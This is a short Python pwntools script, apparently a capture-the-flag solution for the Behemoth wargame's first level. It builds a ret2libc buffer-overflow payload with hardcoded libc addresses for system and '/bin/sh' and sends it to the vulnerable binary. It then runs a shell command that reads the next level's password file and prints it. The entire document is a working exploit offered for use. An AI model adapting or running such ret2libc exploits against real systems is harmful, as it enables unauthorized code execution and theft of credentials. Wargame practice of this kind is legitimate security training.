from pwn import *

offset = 71
libc = 0xf7e12000
system = 0x3a850
binsh = 0x15ccc8

payload = flat(
    offset*b'A',
    libc + system,
    b'BBBB',
    libc + binsh,
)

p = process('/behemoth/behemoth1')
p.clean()
p.sendline(payload)

p.clean()
p.sendline(b'cat /etc/behemoth_pass/behemoth2')
print('\nbehemoth2 pass: ' + p.recvline().decode())
p.close()